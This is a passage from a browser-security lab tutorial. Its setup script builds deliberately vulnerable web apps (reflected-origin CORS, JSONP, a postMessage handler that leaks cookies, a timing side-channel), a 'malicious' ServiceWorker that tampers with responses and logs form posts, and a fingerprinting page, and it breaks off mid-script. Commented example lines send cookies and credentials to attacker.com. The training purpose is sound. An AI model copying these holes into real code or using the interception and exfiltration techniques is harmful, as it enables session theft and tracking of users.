# Tutorial: Browser Internals, V8, and Sandbox Architecture — Hands-On Lab

> **Source reference:** `domain8_chapter8C_browser_internals.md`
> **Scope:** V8 exploitation primitives (addrof/fakeobj/arb-RW, Wasm shellcode injection, heap sandbox bypass), Chrome multi-process architecture and sandbox analysis, Mojo IPC enumeration and exploitation, DOM UAF in Blink, Same-Origin Policy bypass and XS-Leaks, PartitionAlloc internals, browser extension forensics, cookie security analysis, Spectre mitigations (COOP/COEP/CORP), browser fingerprinting, browser fuzzing (Domato, Fuzzilli, sanitizer builds), detection engineering (YARA, Sigma, Suricata, EDR behavioral rules), browser forensics (process memory acquisition, crash dump analysis, cache/history forensics, ServiceWorker forensics), browser hardening (Chrome enterprise policies, Firefox about:config, JIT-less mode), modern attack surface analysis (WebGPU, WebTransport, WebCodecs, Fenced Frames, Speculation Rules API).

---

## Lab Environment Setup

### VM1 — Target Browser Host (10.8.1.10)

A Linux workstation running vulnerable browser builds (Chromium ASan, Firefox debug) and local web applications designed to trigger browser-specific vulnerabilities.

```bash
#!/usr/bin/env bash
# vm1_browser_lab_setup.sh — Browser internals target host
set -euo pipefail

export DEBIAN_FRONTEND=noninteractive

# === System packages ===
apt-get update && apt-get install -y \
  build-essential git curl wget python3 python3-pip python3-venv \
  nodejs npm nginx sqlite3 libsqlite3-dev \
  gdb strace ltrace linux-tools-common linux-tools-generic \
  libx11-dev libxext-dev libxrandr-dev libxcomposite-dev \
  libxdamage-dev libxfixes-dev libnss3 libatk1.0-0 libatk-bridge2.0-0 \
  libcups2 libdrm2 libgbm1 libasound2 libpango-1.0-0 libcairo2 \
  xvfb xauth dbus-x11 fonts-liberation xdg-utils \
  chromium-browser firefox-esr jq lz4 \
  docker.io docker-compose-v2 \
  cmake ninja-build pkg-config \
  protobuf-compiler libprotobuf-dev \
  binutils-dev libunwind-dev

pip3 install --break-system-packages \
  flask aiohttp websockets selenium \
  mitmproxy frida-tools objection \
  yara-python volatility3 \
  playwright

python3 -m playwright install chromium firefox

# === Chromium ASan build (prebuilt for lab) ===
mkdir -p /opt/chromium-asan
cat > /opt/chromium-asan/README.md << 'CHROMIUM_README'
# Chromium ASan Build for Fuzzing/Exploitation Lab

To build Chromium with ASan from source (requires ~100GB disk, ~16GB RAM):

    git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git
    export PATH=/opt/depot_tools:$PATH
    mkdir chromium && cd chromium
    fetch --nohooks chromium
    cd src
    gclient runhooks
    gn gen out/asan --args='
      is_asan=true
      is_debug=false
      symbol_level=1
      is_component_build=false
      dcheck_always_on=true
      v8_enable_sandbox=true
    '
    autoninja -C out/asan chrome

For the lab, use the pre-built ASan Chromium binary at:
    /opt/chromium-asan/chrome

Or use the system Chromium with debug flags:
    chromium-browser --enable-logging=stderr --v=1 \
      --enable-features=V8VmFuture \
      --js-flags="--trace-deopt --trace-turbo"
CHROMIUM_README

# === V8 standalone (d8) for JIT exploitation exercises ===
mkdir -p /opt/v8-debug
cat > /opt/v8-debug/build_d8.sh << 'V8BUILD'
#!/bin/bash
# Build V8 d8 shell with debug/ASan for exploitation exercises
# Requires depot_tools in PATH

cd /opt/v8-debug
fetch v8
cd v8

# Debug build with sandbox enabled
gn gen out/debug --args='
  is_debug=true
  v8_enable_sandbox=true
  v8_enable_disassembler=true
  v8_enable_object_print=true
  dcheck_always_on=true
  v8_enable_verify_heap=true
'
ninja -C out/debug d8

# ASan build for fuzzing
gn gen out/asan --args='
  is_asan=true
  is_debug=false
  v8_enable_sandbox=true
  use_custom_libcxx=false
  sanitizer_coverage_flags="trace-pc-guard"
'
ninja -C out/asan d8

echo "d8 debug build: /opt/v8-debug/v8/out/debug/d8"
echo "d8 ASan build:  /opt/v8-debug/v8/out/asan/d8"
V8BUILD
chmod +x /opt/v8-debug/build_d8.sh

# === Vulnerable web applications for browser attack exercises ===
mkdir -p /opt/browser-lab/apps

# --- App 1: SOP Bypass & XS-Leak Target (Port 3000) ---
cat > /opt/browser-lab/apps/xsleak-target.js << 'XSLEAK_APP'
const http = require('http');
const url = require('url');
const crypto = require('crypto');

const sessions = {};

function generateSession(username) {
  const sid = crypto.randomBytes(16).toString('hex');
  sessions[sid] = { username, loginTime: Date.now(), isAdmin: username === 'admin' };
  return sid;
}

const server = http.createServer((req, res) => {
  const parsed = url.parse(req.url, true);
  const cookies = {};
  (req.headers.cookie || '').split(';').forEach(c => {
    const [k, v] = c.trim().split('=');
    if (k) cookies[k] = v;
  });

  // Deliberately missing security headers for XS-Leak exercises
  // No COOP, COEP, CORP, X-Frame-Options

  if (parsed.pathname === '/login' && req.method === 'POST') {
    let body = '';
    req.on('data', d => body += d);
    req.on('end', () => {
      const params = new URLSearchParams(body);
      const user = params.get('username');
      const pass = params.get('password');
      if (user === 'admin' && pass === 'secret123') {
        const sid = generateSession(user);
        res.writeHead(302, {
          'Set-Cookie': `session=${sid}; Path=/`,
          'Location': '/dashboard'
        });
        res.end();
      } else if (user && pass === 'password') {
        const sid = generateSession(user);
        res.writeHead(302, {
          'Set-Cookie': `session=${sid}; Path=/`,
          'Location': '/profile'
        });
        res.end();
      } else {
        res.writeHead(401, { 'Content-Type': 'text/html' });
        res.end('<h1>Login Failed</h1>');
      }
    });
    return;
  }

  if (parsed.pathname === '/login' && req.method === 'GET') {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(`
      <html><body>
        <h1>Login</h1>
        <form method="POST" action="/login">
          <input name="username" placeholder="Username">
          <input name="password" type="password" placeholder="Password">
          <button type="submit">Login</button>
        </form>
      </body></html>
    `);
    return;
  }

  const session = sessions[cookies.session];

  if (parsed.pathname === '/dashboard') {
    if (session && session.isAdmin) {
      // Admin-only page — XS-Leak: different frame count
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end(`
        <html><body>
          <h1>Admin Dashboard</h1>
          <iframe src="/stats"></iframe>
          <iframe src="/users"></iframe>
          <iframe src="/logs"></iframe>
          <p>Secret: FLAG{xs_leak_frame_count_detected}</p>
        </body></html>
      `);
    } else if (session) {
      res.writeHead(302, { 'Location': '/profile' });
      res.end();
    } else {
      res.writeHead(302, { 'Location': '/login' });
      res.end();
    }
    return;
  }

  if (parsed.pathname === '/profile') {
    if (session) {
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end(`<html><body><h1>Profile: ${session.username}</h1></body></html>`);
    } else {
      res.writeHead(302, { 'Location': '/login' });
      res.end();
    }
    return;
  }

  // Endpoint vulnerable to timing-based XS-Leak
  if (parsed.pathname === '/api/search') {
    const q = parsed.query.q || '';
    if (!session) {
      res.writeHead(401);
      res.end('Unauthorized');
      return;
    }
    const users = ['admin', 'alice', 'bob', 'charlie', 'dave', 'eve'];
    const matches = users.filter(u => u.startsWith(q));
    // Deliberate timing side-channel: sleep proportional to result count
    const delay = matches.length * 50;
    setTimeout(() => {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ count: matches.length }));
    }, delay);
    return;
  }

  // JSONP endpoint (legacy, SOP bypass)
  if (parsed.pathname === '/api/userinfo') {
    const callback = parsed.query.callback;
    if (session) {
      const data = JSON.stringify({
        username: session.username,
        isAdmin: session.isAdmin,
        loginTime: session.loginTime
      });
      if (callback) {
        res.writeHead(200, { 'Content-Type': 'application/javascript' });
        res.end(`${callback}(${data})`);
      } else {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(data);
      }
    } else {
      res.writeHead(401);
      res.end('Unauthorized');
    }
    return;
  }

  // CORS misconfiguration endpoint
  if (parsed.pathname === '/api/sensitive') {
    const origin = req.headers.origin || '';
    if (session) {
      res.writeHead(200, {
        'Content-Type': 'application/json',
        // BUG: reflects any origin
        'Access-Control-Allow-Origin': origin,
        'Access-Control-Allow-Credentials': 'true'
      });
      res.end(JSON.stringify({
        secret: 'FLAG{cors_misconfiguration_reflected_origin}',
        user: session.username,
        token: crypto.randomBytes(32).toString('hex')
      }));
    } else {
      res.writeHead(401);
      res.end('Unauthorized');
    }
    return;
  }

  // Frames for XS-Leak frame counting
  if (['/stats', '/users', '/logs'].includes(parsed.pathname)) {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(`<html><body><p>${parsed.pathname} data</p></body></html>`);
    return;
  }

  // postMessage receiver (vulnerable — no origin check)
  if (parsed.pathname === '/widget') {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(`
      <html>
      <body>
        <div id="output"></div>
        <script>
          window.addEventListener('message', function(e) {
            // BUG: no origin validation
            document.getElementById('output').innerHTML = e.data;
            // Sends back sensitive data to any origin
            e.source.postMessage({
              cookie: document.cookie,
              location: window.location.href
            }, '*');
          });
        </script>
      </body>
      </html>
    `);
    return;
  }

  res.writeHead(404);
  res.end('Not Found');
});

server.listen(3000, '0.0.0.0', () => {
  console.log('XS-Leak target running on :3000');
});
XSLEAK_APP

# --- App 2: Extension Security Test Host (Port 3001) ---
cat > /opt/browser-lab/apps/extension-test.js << 'EXT_APP'
const http = require('http');
const fs = require('fs');
const path = require('path');
const url = require('url');

const server = http.createServer((req, res) => {
  const parsed = url.parse(req.url, true);

  if (parsed.pathname === '/') {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(`
      <html>
      <head><title>Extension Security Test</title></head>
      <body>
        <h1>Extension Security Testing Page</h1>
        <form id="login-form" action="/submit" method="POST">
          <label>Email: <input type="email" name="email" id="email"></label><br>
          <label>Password: <input type="password" name="password" id="password"></label><br>
          <label>Credit Card: <input type="text" name="cc" id="cc" placeholder="4111-1111-1111-1111"></label><br>
          <button type="submit">Submit</button>
        </form>
        <div id="data-target" data-secret="sensitive_api_key_12345">
          Hidden data in attributes
        </div>
        <script>
          // Sensitive data accessible to content scripts via shared DOM
          window.__APP_CONFIG = {
            apiKey: 'sk_live_TESTKEY123456789',
            userId: 'user_42',
            sessionToken: 'eyJhbGciOiJIUzI1NiJ9.test'
          };
        </script>
      </body>
      </html>
    `);
    return;
  }

  if (parsed.pathname === '/submit') {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end('<h1>Submitted</h1>');
    return;
  }

  res.writeHead(404);
  res.end('Not Found');
});

server.listen(3001, '0.0.0.0', () => {
  console.log('Extension test host running on :3001');
});
EXT_APP

# --- App 3: Cookie Security Lab (Port 3002) ---
cat > /opt/browser-lab/apps/cookie-lab.js << 'COOKIE_APP'
const http = require('http');
const url = require('url');
const crypto = require('crypto');

const server = http.createServer((req, res) => {
  const parsed = url.parse(req.url, true);

  if (parsed.pathname === '/set-cookies') {
    const headers = {
      'Content-Type': 'text/html',
    };
    // Multiple Set-Cookie headers demonstrating various configurations
    res.writeHead(200, [
      ['Content-Type', 'text/html'],
      // Insecure cookie — no flags
      ['Set-Cookie', `insecure_session=${crypto.randomBytes(16).toString('hex')}; Path=/`],
      // HttpOnly but no Secure
      ['Set-Cookie', `httponly_session=${crypto.randomBytes(16).toString('hex')}; Path=/; HttpOnly`],
      // Secure + HttpOnly but no SameSite
      ['Set-Cookie', `secure_session=${crypto.randomBytes(16).toString('hex')}; Path=/; Secure; HttpOnly`],
      // Full protection
      ['Set-Cookie', `__Host-protected=${crypto.randomBytes(16).toString('hex')}; Path=/; Secure; HttpOnly; SameSite=Strict`],
      // SameSite=None without Secure (broken)
      ['Set-Cookie', `broken_samesite=${crypto.randomBytes(16).toString('hex')}; Path=/; SameSite=None`],
      // Partitioned cookie (CHIPS)
      ['Set-Cookie', `__Host-partitioned=${crypto.randomBytes(16).toString('hex')}; Path=/; Secure; SameSite=None; Partitioned`],
      // Overly broad domain
      ['Set-Cookie', `broad_cookie=${crypto.randomBytes(16).toString('hex')}; Domain=.lab.local; Path=/`],
    ]);
    res.end(`
      <html><body>
        <h1>Cookies Set</h1>
        <p>Check DevTools → Application → Cookies to inspect cookie attributes.</p>
        <p>document.cookie = <span id="cookies"></span></p>
        <script>
          document.getElementById('cookies').textContent = document.cookie;
        </script>
        <h2>Cookie Security Audit</h2>
        <ul>
          <li>insecure_session: No flags — accessible via JS, sent over HTTP, no CSRF protection</li>
          <li>httponly_session: HttpOnly — not in JS, but sent over HTTP</li>
          <li>secure_session: Secure + HttpOnly — not in JS, HTTPS only, but no SameSite</li>
          <li>__Host-protected: Full protection — Secure, HttpOnly, SameSite=Strict, __Host- prefix</li>
          <li>broken_samesite: SameSite=None WITHOUT Secure — rejected by modern browsers</li>
          <li>__Host-partitioned: CHIPS — partitioned by top-level site</li>
          <li>broad_cookie: Domain=.lab.local — accessible by all subdomains</li>
        </ul>
      </body></html>
    `);
    return;
  }

  if (parsed.pathname === '/steal') {
    // XSS simulation — shows what document.cookie exposes
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(`
      <html><body>
        <h1>Cookie Theft Simulation</h1>
        <p>Cookies accessible to JavaScript (non-HttpOnly):</p>
        <pre id="stolen"></pre>
        <script>
          document.getElementById('stolen').textContent = document.cookie;
          // In a real attack, this would be:
          // new Image().src = 'https://attacker.com/steal?c=' + encodeURIComponent(document.cookie);
        </script>
      </body></html>
    `);
    return;
  }

  if (parsed.pathname === '/') {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(`
      <html><body>
        <h1>Cookie Security Lab</h1>
        <a href="/set-cookies">Set Test Cookies</a><br>
        <a href="/steal">Cookie Theft Simulation</a>
      </body></html>
    `);
    return;
  }

  res.writeHead(404);
  res.end('Not Found');
});

server.listen(3002, '0.0.0.0', () => {
  console.log('Cookie security lab running on :3002');
});
COOKIE_APP

# --- App 4: Service Worker Persistence Lab (Port 3003) ---
mkdir -p /opt/browser-lab/apps/sw-lab
cat > /opt/browser-lab/apps/sw-lab/server.js << 'SW_APP'
const http = require('http');
const fs = require('fs');
const path = require('path');

const server = http.createServer((req, res) => {
  const filePath = path.join(__dirname, 'public', req.url === '/' ? 'index.html' : req.url);
  
  // Service-Worker-Allowed header for scope control
  if (req.url.endsWith('.js') && req.url.includes('sw')) {
    res.setHeader('Service-Worker-Allowed', '/');
  }

  fs.readFile(filePath, (err, data) => {
    if (err) {
      res.writeHead(404);
      res.end('Not Found');
      return;
    }
    const ext = path.extname(filePath);
    const mimeTypes = {
      '.html': 'text/html',
      '.js': 'application/javascript',
      '.json': 'application/json',
      '.css': 'text/css'
    };
    res.writeHead(200, { 'Content-Type': mimeTypes[ext] || 'text/plain' });
    res.end(data);
  });
});

server.listen(3003, '0.0.0.0', () => {
  console.log('ServiceWorker lab running on :3003');
});
SW_APP

mkdir -p /opt/browser-lab/apps/sw-lab/public

cat > /opt/browser-lab/apps/sw-lab/public/index.html << 'SW_INDEX'
<!DOCTYPE html>
<html>
<head><title>ServiceWorker Security Lab</title></head>
<body>
  <h1>ServiceWorker Persistence Lab</h1>
  <button id="register-legit">Register Legitimate SW</button>
  <button id="register-evil">Register "Malicious" SW</button>
  <button id="unregister">Unregister All SWs</button>
  <div id="status"></div>
  <div id="intercepted"></div>

  <h2>Test Requests</h2>
  <button onclick="fetch('/api/data').then(r=>r.json()).then(d=>document.getElementById('intercepted').textContent=JSON.stringify(d))">
    Fetch /api/data
  </button>
  <button onclick="fetch('/api/secret').then(r=>r.json()).then(d=>document.getElementById('intercepted').textContent=JSON.stringify(d))">
    Fetch /api/secret
  </button>

  <script>
    const status = document.getElementById('status');

    document.getElementById('register-legit').onclick = async () => {
      const reg = await navigator.serviceWorker.register('/sw-legit.js', { scope: '/' });
      status.textContent = 'Legitimate SW registered: ' + reg.scope;
    };

    document.getElementById('register-evil').onclick = async () => {
      const reg = await navigator.serviceWorker.register('/sw-evil.js', { scope: '/' });
      status.textContent = 'Malicious SW registered: ' + reg.scope;
    };

    document.getElementById('unregister').onclick = async () => {
      const regs = await navigator.serviceWorker.getRegistrations();
      for (const reg of regs) await reg.unregister();
      status.textContent = 'All ServiceWorkers unregistered';
    };
  </script>
</body>
</html>
SW_INDEX

cat > /opt/browser-lab/apps/sw-lab/public/sw-legit.js << 'SW_LEGIT'
// Legitimate ServiceWorker — caches static assets
self.addEventListener('install', e => {
  e.waitUntil(caches.open('v1').then(c => c.addAll(['/index.html'])));
  self.skipWaiting();
});

self.addEventListener('fetch', e => {
  e.respondWith(caches.match(e.request).then(r => r || fetch(e.request)));
});
SW_LEGIT

cat > /opt/browser-lab/apps/sw-lab/public/sw-evil.js << 'SW_EVIL'
// "Malicious" ServiceWorker for educational demonstration
// Demonstrates persistent interception after XSS-based registration

self.addEventListener('install', e => {
  self.skipWaiting();
  console.log('[EVIL-SW] Installed — persistent MitM active');
});

self.addEventListener('activate', e => {
  e.waitUntil(clients.claim());
  console.log('[EVIL-SW] Activated — intercepting all fetch requests');
});

self.addEventListener('fetch', e => {
  const url = new URL(e.request.url);

  // Intercept API requests and inject/exfiltrate data
  if (url.pathname.startsWith('/api/')) {
    console.log('[EVIL-SW] Intercepted:', url.pathname);

    // Modify response to inject attacker payload
    e.respondWith(
      fetch(e.request).then(response => {
        return response.text().then(body => {
          const modified = body.replace('}', ',"injected":"EVIL_SW_PAYLOAD"}');
          return new Response(modified, {
            status: response.status,
            headers: response.headers
          });
        });
      }).catch(() => {
        // Serve cached poisoned response even when offline
        return new Response(JSON.stringify({
          data: 'poisoned_cache_response',
          note: 'SW persists even after XSS is patched'
        }), { headers: { 'Content-Type': 'application/json' } });
      })
    );
    return;
  }

  // Intercept form submissions and log credentials
  if (e.request.method === 'POST') {
    e.respondWith(
      e.request.clone().text().then(body => {
        console.log('[EVIL-SW] POST intercepted:', url.pathname, body);
        // In a real attack: beacon to attacker C2
        // navigator.sendBeacon('https://attacker.com/steal', body);
        return fetch(e.request);
      })
    );
    return;
  }

  e.respondWith(fetch(e.request));
});
SW_EVIL

# --- App 5: Fingerprinting Demo (Port 3004) ---
cat > /opt/browser-lab/apps/fingerprint-lab.html << 'FP_APP'
<!DOCTYPE html>
<html>
<head>
  <title>Browser Fingerprinting Lab</title>
  <style>
    body { font-family: monospace; max-width: 900px; margin: 0 auto; padding: 20px; }
    .vector { border: 1px solid #333; padding: 10px; margin: 10px 0; }
    .entropy { color: #c00; font-weight: bold; }
    canvas { border: 1px solid #999; }
  </style>
</head>
<body>
  <h1>Browser Fingerprinting Vectors — Lab Exercise</h1>
  <p>Each section demonstrates a fingerprinting vector and estimates its entropy contribution.</p>

  <div class="vector" id="navigator-info">
    <h2>1. Navigator / User-Agent (~8-12 bits)</h2>
    <pre id="nav-output"></pre>
  </div>

  <div class="vector" id="screen-info">
    <h2>2. Screen Resolution (~4-6 bits)</h2>
    <pre id="screen-output"></pre>
  </div>

  <div class="vector" id="canvas-fp">
    <h2>3. Canvas Fingerprint (~8-12 bits)</h2>
    <canvas id="fp-canvas" width="300" height="60"></canvas>
    <pre id="canvas-output"></pre>
  </div>

  <div class="vector" id="webgl-info">
    <h2>4. WebGL Fingerprint (~8-10 bits)</h2>
    <pre id="webgl-output"></pre>
  </div>

  <div class="vector" id="audio-fp">
    <h2>5. AudioContext Fingerprint (~5-8 bits)</h2>
    <pre id="audio-output"></pre>
  </div>

  <div class="vector" id="font-detect">
    <h2>6. Font Detection (~10-15 bits)</h2>
    <pre id="font-output"></pre>
  </div>

  <div class="vector" id="timezone-info">
    <h2>7. Timezone & Locale (~3-5 bits)</h2>
    <pre id="tz-output"></pre>
  </div>

  <div class="vector" id="hardware-info">
    <h2>8. Hardware (~3-5 bits)</h2>
    <pre id="hw-output"></pre>
  </div>

  <div class="vector" id="tls-fp">
    <h2>9. Network / TLS (~5-8 bits)</h2>
    <pre id="tls-output"></pre>
  </div>

  <div class="vector" id="combined">
    <h2>Combined Fingerprint Hash</h2>
    <pre id="combined-output"></pre>
  </div>

  <script>
    const results = {};

    // 1. Navigator
    results.navigator = {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      languages: navigator.languages,
      cookieEnabled: navigator.cookieEnabled,
      doNotTrack: navigator.doNotTrack,
      maxTouchPoints: navigator.maxTouchPoints,
      pdfViewerEnabled: navigator.pdfViewerEnabled
    };
    document.getElementById('nav-output').textContent = JSON.stringify(results.navigator, null, 2);

    // 2. Screen
    results.screen = {
      width: screen.width,
      height: screen.height,
      colorDepth: screen.colorDepth,
      pixelDepth: screen.pixelDepth,
      devicePixelRatio: window.devicePixelRatio,
      availWidth: screen.availWidth,
      availHeight: screen.availHeight
    };
    document.getElementById('screen-output').textContent = JSON.stringify(results.screen, null, 2);

    // 3. Canvas fingerprint
    const canvas = document.getElementById('fp-canvas');
    const ctx = canvas.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillStyle = '#f60';
    ctx.fillRect(125, 1, 62, 20);
    ctx.fillStyle = '#069';
    ctx.fillText('Browser Fingerprint Lab', 2, 15);
    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
    ctx.fillText('Canvas Text Rendering', 4, 35);
    ctx.beginPath();
    ctx.arc(50, 30, 20, 0, Math.PI * 2);
    ctx.fillStyle = '#f9c';
    ctx.fill();

    const canvasData = canvas.toDataURL();
    // Simple hash
    let canvasHash = 0;
    for (let i = 0; i < canvasData.length; i++) {
      canvasHash = ((canvasHash << 5) - canvasHash + canvasData.charCodeAt(i)) | 0;
    }
    results.canvas = { hash: canvasHash.toString(16), length: canvasData.length };
    document.getElementById('canvas-output').textContent =
      `Canvas hash: ${results.canvas.hash}\nData URL length: ${results.canvas.length}`;

    // 4. WebGL
    try {
      const gl = document.createElement('canvas').getContext('webgl');
      if (gl) {
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        results.webgl = {
          vendor: gl.getParameter(gl.VENDOR),
          renderer: gl.getParameter(gl.RENDERER),
          unmaskedVendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'N/A',
          unmaskedRenderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A',
          maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
          maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS),
          extensions: gl.getSupportedExtensions().length + ' extensions'
        };
      }
    } catch(e) {
      results.webgl = { error: e.message };
    }
    document.getElementById('webgl-output').textContent = JSON.stringify(results.webgl, null, 2);

    // 5. AudioContext fingerprint
    try {
      const audioCtx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
      const oscillator = audioCtx.createOscillator();
      oscillator.type = 'triangle';
      oscillator.frequency.setValueAtTime(10000, audioCtx.currentTime);
      const compressor = audioCtx.createDynamicsCompressor();
      compressor.threshold.setValueAtTime(-50, audioCtx.currentTime);
      compressor.knee.setValueAtTime(40, audioCtx.currentTime);
      compressor.ratio.setValueAtTime(12, audioCtx.currentTime);
      compressor.attack.setValueAtTime(0, audioCtx.currentTime);
      compressor.release.setValueAtTime(0.25, audioCtx.currentTime);
      oscillator.connect(compressor);
      compressor.connect(audioCtx.destination);
      oscillator.start(0);
      audioCtx.startRendering().then(buffer => {
        const data = buffer.getChannelData(0);
        let audioHash = 0;
        for (let i = 4500; i < 5000; i++) {
          audioHash += Math.abs(data[i]);
        }
        results.audio = { hash: audioHash.toFixed(10), sampleRate: audioCtx.sampleRate };
        document.getElementById('audio-output').textContent = JSON.stringify(results.audio, null, 2);
        updateCombined();
      });
    } catch(e) {
      results.audio = { error: e.message };
      document.getElementById('audio-output').textContent = e.message;
    }

    // 6. Font detection
    const testFonts = [
      'Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia',
      'Comic Sans MS', 'Impact', 'Trebuchet MS', 'Palatino Linotype',
      'Lucida Console', 'Tahoma', 'Segoe UI', 'Consolas', 'Cambria',
      'Calibri', 'Helvetica Neue', 'Fira Code', 'Source Code Pro',
      'Ubuntu', 'Roboto', 'Open Sans', 'Noto Sans', 'DejaVu Sans',
      'Liberation Serif', 'Monaco', 'Menlo', 'SF Mono', 'Cascadia Code'
    ];
    const baseFonts = ['monospace', 'sans-serif', 'serif'];
    const testString = 'mmmmmmmmmmlli';
    const testSize = '72px';
    const span = document.createElement('span');
    span.style.fontSize = testSize;
    span.style.position = 'absolute';
    span.style.left = '-9999px';
    span.textContent = testString;
    document.body.appendChild(span);

    const baseWidths = {};
    baseFonts.forEach(base => {
      span.style.fontFamily = base;
      baseWidths[base] = span.offsetWidth;
    });

    const detectedFonts = [];
    testFonts.forEach(font => {
      const detected = baseFonts.some(base => {
        span.style.fontFamily = `'${font}', ${base}`;
        return span.offsetWidth !== baseWidths[base];
      });
      if (detected) detectedFonts.push(font);
    });
    document.body.removeChild(span);

    results.fonts = { detected: detectedFonts, count: detectedFonts.length };
    document.getElementById('font-output').textContent =
      `Detected ${detectedFonts.length}/${testFonts.length} fonts:\n${detectedFonts.join(', ')}`;

    // 7. Timezone
    results.timezone = {
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      offset: new Date().getTimezoneOffset(),
      locale: Intl.DateTimeFormat().resolvedOptions().locale,
      numberFormat: new Intl.NumberFormat().resolvedOptions().locale
    };
    document.getElementById('tz-output').textContent = JSON.stringify(results.timezone, null, 2);

    // 8. Hardware
    results.hardware = {
      hardwareConcurrency: navigator.hardwareConcurrency,
      deviceMemory: navigator.deviceMemory || 'N/A',
      maxTouchPoints: navigator.maxTouchPoints,
      connection: navigator.connection ? {
        effectiveType: navigator.connection.effectiveType,
        downlink: navigator.connection.downlink,
        rtt: navigator.connection.rtt
      } : 'N/A'
    };
    document.getElementById('hw-output').textContent = JSON.stringify(results.hardware, null, 2);

    // 9. TLS/Network (limited from browser JS)
    results.tls = {
      note: 'TLS fingerprinting (JA3/JA4) requires network-level capture.',
      protocol: window.location.protocol,
      securityPolicy: document.securityPolicy || 'N/A',
      featurePolicy: {
        camera: document.featurePolicy ? document.featurePolicy.allowsFeature('camera') : 'N/A',
        microphone: document.featurePolicy ? document.featurePolicy.allowsFeature('microphone') : 'N/A',
        geolocation: document.featurePolicy ? document.featurePolicy.allowsFeature('geolocation') : 'N/A'
      }
    };
    document.getElementById('tls-output').textContent = JSON.stringify(results.tls, null, 2);

    // Combined
    function updateCombined() {
      const fingerprint = JSON.stringify(results);
      let hash = 0;
      for (let i = 0; i < fingerprint.length; i++) {
        hash = ((hash << 5) - hash + fingerprint.charCodeAt(i)) | 0;
      }
      const totalEntropy = '~33-50 bits (sufficient to uniquely identify most users)';
      document.getElementById('combined-output').textContent =
        `Combined hash: ${hash.toString(16)}\nEstimated entropy: ${totalEntropy}\n` +
        `Components: ${Object.keys(results).length} vectors\n` +
        `Full fingerprint size: ${fingerprint.length} bytes`;
    }
    updateCombined();
  </script>
</body>
</html>
FP_APP

# --- App 6: Spectre Mitigation Checker (Port 3005) ---
cat > /opt/browser-lab/apps/spectre-checker.js << 'SPECTRE_APP'
const http = require('http');

const server = http.createServer((req, res) => {
  if (req.url === '/secure') {
    // Fully cross-origin isolated page
    res.writeHead(200, {
      'Content-Type': 'text/html',
      'Cross-Origin-Opener-Policy': 'same-origin',
      'Cross-Origin-Embedder-Policy': 'require-corp',
      'Cross-Origin-Resource-Policy': 'same-origin'
    });
    res.end(`
      <html><body>
        <h1>Cross-Origin Isolated Page</h1>
        <pre>
crossOriginIsolated: <span id="coi"></span>
SharedArrayBuffer available: <span id="sab"></span>
performance.now() resolution test: <span id="perf"></span>
        </pre>
        <script>
          document.getElementById('coi').textContent = self.crossOriginIsolated;
          document.getElementById('sab').textContent = typeof SharedArrayBuffer !== 'undefined';
          // Test performance.now resolution
          const times = [];
          for (let i = 0; i < 100; i++) {
            const t1 = performance.now();
            const t2 = performance.now();
            if (t2 > t1) times.push(t2 - t1);
          }
          const minDelta = Math.min(...times);
          document.getElementById('perf').textContent =
            minDelta.toFixed(6) + 'ms minimum delta (' +
            (minDelta < 0.01 ? 'HIGH RESOLUTION — Spectre risk' : 'REDUCED — mitigated') + ')';
        </script>
      </body></html>
    `);
    return;
  }

  if (req.url === '/insecure') {
    // No cross-origin isolation headers
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(`
      <html><body>
        <h1>Non-Isolated Page (Default)</h1>
        <pre>
crossOriginIsolated: <span id="coi"></span>
SharedArrayBuffer available: <span id="sab"></span>
performance.now() resolution test: <span id="perf"></span>
        </pre>
        <script>
          document.getElementById('coi').textContent = self.crossOriginIsolated;
          document.getElementById('sab').textContent = typeof SharedArrayBuffer !== 'undefined';
          const times = [];
          for (let i = 0; i < 100; i++) {
            const t1 = performance.now();
            const t2 = performance.now();
            if (t2 > t1) times.push(t2 - t1);
          }
          const minDelta = Math.min(...times);
          document.getElementById('perf').textContent =
            minDelta.toFixed(6) + 'ms minimum delta (' +
            (minDelta < 0.01 ? 'HIGH RESOLUTION — Spectre risk' : 'REDUCED — mitigated') + ')';
        </script>
      </body></html>
    `);
    return;
  }

  // Resource with CORP header for COEP testing
  if (req.url === '/api/data') {
    res.writeHead(200, {
      'Content-Type': 'application/json',
      'Cross-Origin-Resource-Policy': 'same-origin'
    });
    res.end(JSON.stringify({ data: 'protected_resource' }));
    return;
  }

  res.writeHead(200, { 'Content-Type': 'text/html' });
  res.end(`
    <html><body>
      <h1>Spectre Mitigation Checker</h1>
      <a href="/secure">Cross-Origin Isolated Page (COOP+COEP)</a><br>
      <a href="/insecure">Non-Isolated Page (default)</a>
    </body></html>
  `);
});

server.listen(3005, '0.0.0.0', () => {
  console.log('Spectre checker running on :3005');
});
SPECTRE_APP

# --- Static file server for fingerprint lab (Port 3004) ---
cat > /opt/browser-lab/apps/static-server.js << 'STATIC'
const http = require('http');
const fs = require('fs');
http.createServer((req, res) => {
  if (req.url === '/' || req.url === '/index.html') {
    const data = fs.readFileSync('/opt/browser-lab/apps/fingerprint-lab.html');
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(data);
  } else {
    res.writeHead(404);
    res.end('Not Found');
